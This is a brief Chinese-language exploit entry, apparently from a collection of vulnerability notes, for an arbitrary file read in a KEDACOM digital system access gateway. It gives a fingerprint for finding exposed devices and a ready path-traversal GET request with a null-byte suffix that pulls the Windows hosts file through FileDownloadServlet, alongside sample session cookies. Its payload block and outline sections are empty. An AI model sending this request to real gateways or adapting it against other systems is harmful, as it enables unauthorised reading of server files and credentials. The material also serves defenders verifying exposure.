# KEDACOM数字系统接入网关任意文件读取漏洞

- **系统**：KEDACOM　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`web.body="/**起始端口变量*/"`
- **请求**：`GET /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=FAEECB621961790CDFC5AB87BBEB1E20; JSESSIONID=760C78AEAACEFF5C9110E589…`

**请求体 / payload**
```

```

**其他**
- KEDACOM数字系统接入网关 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * KEDACOM 数字系统接入网关